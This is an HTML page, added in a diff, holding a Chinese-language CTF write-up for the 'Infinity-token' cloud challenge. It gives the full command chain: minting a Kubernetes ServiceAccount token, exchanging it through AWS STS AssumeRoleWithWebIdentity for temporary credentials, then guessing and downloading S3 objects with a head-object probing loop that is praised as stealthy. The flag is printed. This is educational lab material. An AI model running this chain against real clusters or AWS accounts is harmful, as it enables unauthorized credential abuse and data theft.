@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-scheme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>[Cloud] Infinity-token - AWS IRSA + S3 横向渗透 | WP</title>
+    <style>
+        :root {
+            --bg: #0d1117;
+            --surface: #161b22;
+            --border: #30363d;
+            --text: #c9d1d9;
+            --text-secondary: #8b949e;
+            --accent: #58a6ff;
+            --accent-glow: #1f6feb;
+            --code-bg: #0d1117;
+            --code-border: #30363d;
+            --line-number: #484f58;
+            --green: #3fb950;
+            --orange: #d2991d;
+            --red: #f85149;
+            --purple: #a371f7;
+            --cyan: #39c5cf;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', 'Helvetica Neue', Arial, sans-serif;
+            line-height: 1.7;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* Background subtle grid pattern */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            background-image:
+                linear-gradient(rgba(48, 54, 61, 0.15) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(48, 54, 61, 0.15) 1px, transparent 1px);
+            background-size: 40px 40px;
+            mask-image: radial-gradient(ellipse at 50% 0%, black 40%, transparent 70%);
+            -webkit-mask-image: radial-gradient(ellipse at 50% 0%, black 40%, transparent 70%);
+        }
+
+        .wp-content {
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 48px 28px 64px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ========== HEADER ========== */
+        .wp-header {
+            margin-bottom: 36px;
+            padding-bottom: 28px;
+            border-bottom: 1px solid var(--border);
+            position: relative;
+        }
+
+        .wp-header::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 0;
+            width: 80px;
+            height: 3px;
+            background: linear-gradient(90deg, var(--accent), var(--purple));
+            border-radius: 2px;
+        }
+
+        .wp-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(248, 81, 73, 0.12);
+            border: 1px solid rgba(248, 81, 73, 0.3);
+            color: var(--red);
+            font-size: 0.8rem;
+            font-weight: 600;
+            padding: 5px 12px;
+            border-radius: 20px;
+            letter-spacing: 0.5px;
+            margin-bottom: 16px;
+            text-transform: uppercase;
+        }
+
+        .wp-badge::before {
+            content: '🏆';
+            font-size: 0.85rem;
+        }
+
+        .wp-title {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #f0f6fc;
+            letter-spacing: -0.3px;
+            margin-bottom: 8px;
+            line-height: 1.3;
+        }
+
+        .sub-title {
+            font-size: 1.05rem;
+            font-weight: 400;
+            color: var(--text-secondary);
+            margin-bottom: 18px;
+            line-height: 1.5;
+        }
+
+        .wp-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .wp-meta span {
+            display: inline-block;
+            font-size: 0.82rem;
+            padding: 4px 12px;
+            border-radius: 14px;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            white-space: nowrap;
+        }
+
+        .wp-meta span:last-child {
+            background: rgba(210, 153, 29, 0.1);
+            border-color: rgba(210, 153, 29, 0.35);
+            color: var(--orange);
+            font-weight: 600;
+        }
+
+        /* ========== SECTIONS ========== */
+        .wp-section {
+            margin-bottom: 32px;
+            animation: fadeInUp 0.45s ease forwards;
+            opacity: 0;
+        }
+
+        .wp-section:nth-child(1) {
+            animation-delay: 0s;
+        }
+        .wp-section:nth-child(2) {
+            animation-delay: 0.06s;
+        }
+        .wp-section:nth-child(3) {
+            animation-delay: 0.12s;
+        }
+        .wp-section:nth-child(4) {
+            animation-delay: 0.18s;
+        }
+        .wp-section:nth-child(5) {
+            animation-delay: 0.24s;
+        }
+        .wp-section:nth-child(6) {
+            animation-delay: 0.30s;
+        }
+        .wp-section:nth-child(7) {
+            animation-delay: 0.36s;
+        }
+        .wp-section:nth-child(8) {
+            animation-delay: 0.42s;
+        }
+        .wp-section:nth-child(9) {
+            animation-delay: 0.48s;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(14px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .wp-section h2 {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: #f0f6fc;
+            margin-bottom: 12px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid var(--border);
+            letter-spacing: -0.2px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .wp-section h2::before {
+            content: '';
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: var(--accent);
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+
+        .wp-section p {
+            font-size: 0.95rem;
+            color: var(--text);
+            margin-bottom: 12px;
+            line-height: 1.75;
+        }
+
+        .wp-section p strong {
+            color: #f0f6fc;
+            font-weight: 600;
+        }
+
+        /* ========== CODE / IDE BLOCK ========== */
+        .ide {
+            background: var(--code-bg);
+            border: 1px solid var(--code-border);
+            border-radius: 8px;
+            margin: 16px 0 20px;
+            overflow: hidden;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.3);
+            position: relative;
+        }
+
+        .ide::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 34px;
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            z-index: 1;
+            display: flex;
+            align-items: center;
+            padding: 0 14px;
+        }
+
+        .ide::after {
+            content: '●   ●   ●';
+            position: absolute;
+            top: 0;
+            left: 14px;
+            height: 34px;
+            display: flex;
+            align-items: center;
+            font-size: 0.55rem;
+            letter-spacing: 3px;
+            color: #484f58;
+            z-index: 2;
+        }
+
+        .ide pre {
+            padding: 44px 0 18px 0;
+            margin: 0;
+            overflow-x: auto;
+            font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', 'SF Mono', 'Consolas', 'Monaco', monospace;
+            font-size: 0.84rem;
+            line-height: 0.7;
+            position: relative;
+            z-index: 0;
+            counter-reset: line;
+        }
+
+        .ide pre .line {
+            display: block;
+            padding: 1px 18px 1px 58px;
+            position: relative;
+            white-space: pre-wrap;
+            word-break: break-all;
+            color: #c9d1d9;
+            transition: background 0.15s;
+            min-height: 1em;
+        }
+
+        .ide pre .line::before {
+            counter-increment: line;
+            content: counter(line);
+            position: absolute;
+            left: 12px;
+            width: 36px;
+            text-align: right;
+            color: var(--line-number);
+            font-size: 0.78rem;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        .ide pre .line:hover {
+            background: rgba(88, 166, 255, 0.04);
+        }
+
+        /* Syntax highlight classes */
+        .kw {
+            color: #ff7b72;
+        }
+        .str {
+            color: #a5d6ff;
+        }
+        .num {
+            color: #79c0ff;
+        }
+        .cm {
+            color: #8b949e;
+            font-style: italic;
+        }
+        .fn {
+            color: #d2a8ff;
+        }
+        .op {
+            color: #ff7b72;
+        }
+        .var {
+            color: #ffa657;
+        }
+
+        /* ========== FLAG BLOCK ========== */
+        .flag-block {
+            background: linear-gradient(135deg, rgba(63, 185, 80, 0.08), rgba(63, 185, 80, 0.02));
+            border: 1px solid rgba(63, 185, 80, 0.4);
+            border-left: 4px solid var(--green);
+            border-radius: 6px;
+            padding: 18px 22px;
+            margin: 20px 0;
+            font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', 'SF Mono', 'Consolas', monospace;
+            font-size: 1.05rem;
+            font-weight: 600;
+            color: var(--green);
+            word-break: break-all;
+            letter-spacing: 0.3px;
+            box-shadow: 0 0 20px rgba(63, 185, 80, 0.08);
+            position: relative;
+        }
+
+        .flag-block::before {
+            content: '🚩 FLAG';
+            position: absolute;
+            top: -11px;
+            left: 16px;
+            background: var(--bg);
+            padding: 2px 10px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            color: var(--green);
+            letter-spacing: 1px;
+            border-radius: 3px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+
+        /* ========== RESPONSIVE ========== */
+        @media (max-width: 768px) {
+            .wp-content {
+                padding: 24px 16px 40px;
+            }
+
+            .wp-title {
+                font-size: 1.5rem;
+            }
+
+            .sub-title {
+                font-size: 0.9rem;
+            }
+
+            .ide pre {
+                font-size: 0.75rem;
+            }
+
+            .ide pre .line {
+                padding: 1px 12px 1px 48px;
+            }
+
+            .ide pre .line::before {
+                left: 6px;
+                width: 32px;
+                font-size: 0.7rem;
+            }
+
+            .wp-meta {
+                gap: 8px;
+            }
+
+            .wp-meta span {
+                font-size: 0.72rem;
+                padding: 3px 10px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .wp-title {
+                font-size: 1.3rem;
+            }
+
+            .ide pre {
+                font-size: 0.7rem;
+            }
+
+            .ide pre .line {
+                padding: 1px 8px 1px 40px;
+            }
+
+            .ide pre .line::before {
+                left: 4px;
+                width: 28px;
+                font-size: 0.65rem;
+            }
+
+            .flag-block {
+                font-size: 0.85rem;
+                padding: 14px 16px;
+            }
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            height: 6px;
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 3px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #484f58;
+        }
+
+        /* Print styles */
+        @media print {
+            body {
+                background: #fff;
+                color: #000;
+            }
+            .ide {
+                background: #f6f8fa;
+                border: 1px solid #d0d7de;
+            }
+            .ide pre .line {
+                color: #24292f;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="wp-content">
+
+        <!-- HEADER -->
+        <div class="wp-header">
+            <div class="wp-badge">🥈 二血</div>
+            <h1 class="wp-title">[Cloud] Infinity-token — AWS IRSA + S3 横向渗透</h1>
+            <h4 class="sub-title">Kubernetes ServiceAccount Token → AWS STS AssumeRole → S3 Bucket 探测与下载</h4>
+            <div class="wp-meta">
+                <span>Cloud / AWS / IRSA / S3 / OIDC</span>
+                <span>难度：困难</span>
+                <span>500队 &lt;10解出</span>
+            </div>
+        </div>
+
+        <!-- 0x00 -->
+        <div class="wp-section">
+            <h2>0x00 题目背景与分析</h2>
+            <p>本题出现在约 <strong>500 队规模的赛事</strong>中，最终仅有 <strong>不到 10 队</strong>成功解出，属于高难度云安全方向的 CTF 题目。核心攻击链涉及 <strong>Kubernetes ServiceAccount Token</strong> 的滥用，结合 <strong>AWS IRSA（IAM Roles for Service Accounts）</strong>机制进行横向渗透，最终在 <strong>S3 Bucket</strong> 中定位并读取 Flag 文件。</p>
+            <p>选手获得一个 <strong>kubeconfig 文件</strong>以及部分 AWS 相关的上下文信息，需要通过 <code>kubectl</code> 创建 token、调用 <code>aws sts assume-role-with-web-identity</code> 换取临时凭证，再利用 <code>s3api head-object</code> 探测 S3 对象并下载 Flag。</p>
+        </div>
+
+        <!-- 0x01 -->
+        <div class="wp-section">
+            <h2>0x01 Kubernetes Token 生成</h2>
+            <p>首先使用题目提供的 <strong>kubeconfig</strong> 文件，为 ServiceAccount <code>nakime</code> 创建一个 JWT Token，并指定 <strong>audience</strong> 为 <code>sts.amazonaws.com</code>。这是触发 AWS IRSA 流程的关键——Token 的 audience 必须与 AWS OIDC Provider 配置匹配。</p>
+            <div class="ide">
+                <pre><span class="line">kubectl --kubeconfig=kubeconfig.yaml \</span>
+                    <span class="line">  --insecure-skip-tls-verify=true \</span>
+                    <span class="line">  -n infinity-castle \</span>
+                    <span class="line">  create token nakime \</span>
+                    <span class="line">  --audiences=sts.amazonaws.com \</span>
+                    <span class="line">  > /tmp/nakime-token-aud-sts.jwt</span></pre>
+            </div>
+            <p>成功执行后，<code>/tmp/nakime-token-aud-sts.jwt</code> 文件被写入。Token 的 <strong>payload</strong> 中包含关键字段：</p>
+            <div class="ide">
+                <pre><span class="line">{</span>
+                    <span class="line">  "aud": ["sts.amazonaws.com"],</span>
+                    <span class="line">  "iss": "https://oidc.eks.us-east-1.amazonaws.com/id/2217560D8A76DCD08A204B66621B75E4",</span>
+                    <span class="line">  "kubernetes.io": {</span>
+                    <span class="line">    "namespace": "infinity-castle",</span>
+                    <span class="line">    "serviceaccount": {</span>
+                    <span class="line">      "name": "nakime",</span>
+                    <span class="line">      "uid": "e65abc20-d6d8-4fa7-9334-841c386328de"</span>
+                    <span class="line">    }</span>
+                    <span class="line">  },</span>
+                    <span class="line">  "sub": "system:serviceaccount:infinity-castle:nakime"</span>
+                    <span class="line">}</span></pre>
+            </div>
+            <p>确认 <code>aud</code> 字段包含 <code>sts.amazonaws.com</code> 后，即可进行下一步的 <strong>STS AssumeRole</strong> 调用。</p>
+        </div>
+
+        <!-- 0x02 -->
+        <div class="wp-section">
+            <h2>0x02 AWS STS AssumeRoleWithWebIdentity</h2>
+            <p>使用上一步生成的 JWT Token，调用 <code>aws sts assume-role-with-web-identity</code> 换取 AWS 临时凭证。目标角色 ARN 为：</p>
+            <div class="ide">
+                <pre><span class="line">arn:aws:iam::946313059530:role/ds-k8s-infinity-irsa-infinity-castle</span></pre>
+            </div>
+            <p>完整命令如下：</p>
+            <div class="ide">
+                <pre><span class="line">aws sts assume-role-with-web-identity \</span>
+                    <span class="line">  --role-arn arn:aws:iam::946313059530:role/ds-k8s-infinity-irsa-infinity-castle \</span>
+                    <span class="line">  --role-session-name ctf-session \</span>
+                    <span class="line">  --web-identity-token file:///tmp/nakime-token-aud-sts.jwt \</span>
+                    <span class="line">  --duration-seconds 900 \</span>
+                    <span class="line">  > /tmp/nakime_creds.json</span></pre>
+            </div>
+            <p>返回的 JSON 包含 <strong>AccessKeyId</strong>、<strong>SecretAccessKey</strong> 和 <strong>SessionToken</strong>，有效期 15 分钟。导出到环境变量：</p>
+            <div class="ide">
+                <pre><span class="line">export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' /tmp/nakime_creds.json)</span>
+                    <span class="line">export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' /tmp/nakime_creds.json)</span>
+                    <span class="line">export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' /tmp/nakime_creds.json)</span></pre>
+            </div>
+        </div>
+
+        <!-- 0x03 -->
+        <div class="wp-section">
+            <h2>0x03 S3 Bucket 探测策略</h2>
+            <p>目标 Bucket 名称为：</p>
+            <div class="ide">
+                <pre><span class="line">ds-k8s-infinity-flag-1757980242-f93750</span></pre>
+            </div>
+            <p>由于不具备 <code>s3:ListBucket</code> 权限，无法直接列出所有对象，因此采用 <strong>head-object 逐个探测</strong>的策略。这种方式的优势：</p>
+            <p>
+                <strong>① 速度快</strong>——仅发送 HEAD 请求，不传输数据<br>
+                <strong>② 隐蔽性好</strong>——不会触发大量数据传输告警<br>
+                <strong>③ 错误可区分</strong>——NoSuchKey（不存在）vs AccessDenied（无权限）可分别处理
+            </p>
+            <p>候选 Key 列表基于常见命名模式构建，并结合 Bucket 名称中的时间戳/随机后缀进行推测：</p>
+            <div class="ide">
+                <pre><span class="line">CANDIDATES="flag flag.txt cuhk25ctf.txt flag.json flag.yaml flag.yml \</span>
+                    <span class="line">  secret.txt README.txt index.html flag.zip flag.gz \</span>
+                    <span class="line">  flag-1757980242-f93750 flag-1757980242-f93750.txt \</span>
+                    <span class="line">  ds-k8s-infinity-flag-1757980242-f93750.txt"</span></pre>
+            </div>
+        </div>
+
+        <!-- 0x04 -->
+        <div class="wp-section">
+            <h2>0x04 自动化探测与下载脚本</h2>
+            <p>将整个流程整合为一个 Bash 脚本，实现：凭证导出 → 候选探测 → 命中下载 → 安全预览的完整自动化。核心探测循环如下：</p>
+            <div class="ide">
+                <pre><span class="line">for key in $CANDIDATES; do</span>
+                    <span class="line">  echo "---- probe -> $key ----"</span>
+                    <span class="line">  if aws s3api head-object \</span>
+                    <span class="line">    --bucket "$BUCKET" \</span>
+                    <span class="line">    --key "$key" >/dev/null 2>&1; then</span>
+                    <span class="line">    echo "[FOUND] $key"</span>
+                    <span class="line">    aws s3 cp "s3://${BUCKET}/${key}" /tmp/flag_found/</span>
+                    <span class="line">    cat -v /tmp/flag_found/"$key" | sed -n '1,200p'</span>
+                    <span class="line">    exit 0</span>
+                    <span class="line">  fi</span>
+                    <span class="line">done</span></pre>
+            </div>
+            <p>脚本执行后，在 <strong>第二个候选</strong> <code>flag.txt</code> 处成功命中：</p>
+            <div class="ide">
+                <pre><span class="line">---- probe -> flag ----</span>
+                    <span class="line">---- probe -> flag.txt ----</span>
+                    <span class="line">[FOUND] flag.txt</span>
+                    <span class="line">download: s3://ds-k8s-infinity-flag-1757980242-f93750/flag.txt</span>
+                    <span class="line">  to ../../../../../../../tmp/flag_found/flag.txt</span>
+                    <span class="line">[SAVED] /tmp/flag_found/flag.txt</span>
+                    <span class="line">---- 文件类型 ----</span>
+                    <span class="line">/tmp/flag_found/flag.txt: ASCII text</span></pre>
+            </div>
+        </div>
+
+        <!-- 0x05 -->
+        <div class="wp-section">
+            <h2>0x05 完整攻击链总结</h2>
+            <p>整条攻击链可概括为以下步骤：</p>
+            <div class="ide">
+                <pre><span class="line">┌─────────────────────────────────────────────────────────┐</span>
+                    <span class="line">│ 1. kubectl create token (audience=sts.amazonaws.com)  │</span>
+                    <span class="line">│         ↓ JWT Token → /tmp/nakime-token-aud-sts.jwt    │</span>
+                    <span class="line">│ 2. aws sts assume-role-with-web-identity               │</span>
+                    <span class="line">│         ↓ Temp Creds → /tmp/nakime_creds.json           │</span>
+                    <span class="line">│ 3. Export AWS_ACCESS_KEY_ID / SECRET / SESSION_TOKEN   │</span>
+                    <span class="line">│ 4. s3api head-object (候选探测, 非ListBucket)          │</span>
+                    <span class="line">│         ↓ 命中 flag.txt                                │</span>
+                    <span class="line">│ 5. s3 cp → /tmp/flag_found/flag.txt                    │</span>
+                    <span class="line">│ 6. cat → cuhk25ctf{n4k1m3_b1w4_01dc_w4rp_g4t3}        │</span>
+                    <span class="line">└─────────────────────────────────────────────────────────┘</span></pre>
+            </div>
+        </div>
+
+        <!-- 0x06 -->
+        <div class="wp-section">
+            <h2>0x06 关键技术点</h2>
+            <p>
+                <strong>🔑 IRSA (IAM Roles for Service Accounts)：</strong>AWS EKS 中用于将 Kubernetes ServiceAccount 映射到 IAM Role 的机制。关键在于 OIDC Provider 的信任关系配置，允许持有特定 audience Token 的主体进行 AssumeRole。<br><br>
+                <strong>🔍 head-object vs list-objects：</strong>当 S3 Bucket 仅授予 <code>s3:GetObject</code> 权限但未授予 <code>s3:ListBucket</code> 时，无法列出对象列表，但可以通过 <strong>猜测 Key 名称</strong>并使用 head-object 逐一验证对象是否存在。这在 CTF 中是常见的权限绕过技巧。<br><br>
+                <strong>🛡️ cat -v 安全输出：</strong>使用 <code>cat -v</code> 将非打印字符可视化，防止 Flag 文件中可能嵌入的 ANSI 控制序列被执行或隐藏真实内容。
+            </p>
+        </div>
+
+        <!-- 0x07 -->
+        <div class="wp-section">
+            <h2>0x07 Flag</h2>
+            <div class="flag-block">
+                cuhk25ctf{n4k1m3_b1w4_01dc_w4rp_g4t3}
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Line number injection script -->
+    <script>
+        document.querySelectorAll('.ide pre').forEach(pre => {
+            const lines = pre.querySelectorAll('.line');
+            lines.forEach((line, i) => {
+                // Keep existing classes but ensure data-line is set
+                line.setAttribute('data-line', i + 1);
+            });
+        });
+
+        // Add subtle console easter egg
+        console.log('%c🏴‍☠️  Infinity Token Writeup  %c|  cuhk25ctf{n4k1m3_b1w4_01dc_w4rp_g4t3}',
+            'color: #3fb950; font-size: 1.2em; font-weight: bold;',
+            'color: #8b949e;');
+    </script>
+
+</body>
+</html>
